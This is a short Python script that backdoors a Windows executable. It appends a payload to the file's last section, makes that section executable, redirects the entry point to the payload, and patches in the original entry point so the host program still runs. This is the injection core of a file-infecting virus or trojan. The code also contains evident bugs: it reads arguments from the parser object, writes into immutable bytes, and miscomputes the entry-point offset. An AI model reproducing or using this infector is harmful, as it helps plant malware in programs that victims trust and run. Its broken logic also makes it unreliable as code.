#!/usr/bin/python3

from argparse import ArgumentParser
from pefile import PE, SECTION_CHARACTERISTICS
from struct import pack

def main():
    parser = ArgumentParser()
    parser.add_argument('input_file', help='File to infect')
    parser.add_argument('payload', help='Payload to be inject')
    parser.add_argument('output_file', help='Output file')
    args = parser.parse_args()

    dst_pe = PE(parser.input_file)
    payload_pe = PE(parser.payload)

    with open(parser.payload, 'rb') as file:
        payload_data = file.read()

    oep = dst_pe.OPTIONAL_HEADER.AddressOfEntryPoint
    nep = payload_pe.OPTIONAL_HEADER.AddressOfEntryPoint

    last_section = dst_pe.sections[-1]
    last_section.SizeOfRawData += len(payload_data)
    last_section.Misc_VirtualSize = last_section.SizeOfRawData
    last_section.Characteristics = \
        SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_READ'] | \
        SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_WRITE'] | \
        SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE']

    dst_pe.OPTIONAL_HEADER.AddressOfEntryPoint = \
        nep + last_section.VirtualAddress + last_section.SizeOfRawData
    pattern = bytes.fromhex('1234567890abcdeffedcba0987654321')
    pos = payload_data.find(pattern)
    payload_data[pos+16:pos+16+8] = pack("Q", oep)

    data = dst_pe.write() + payload_data

    with open(parser.output_file, 'wb') as file:
        file.write(data)

if __name__ == '__main__':
    main()
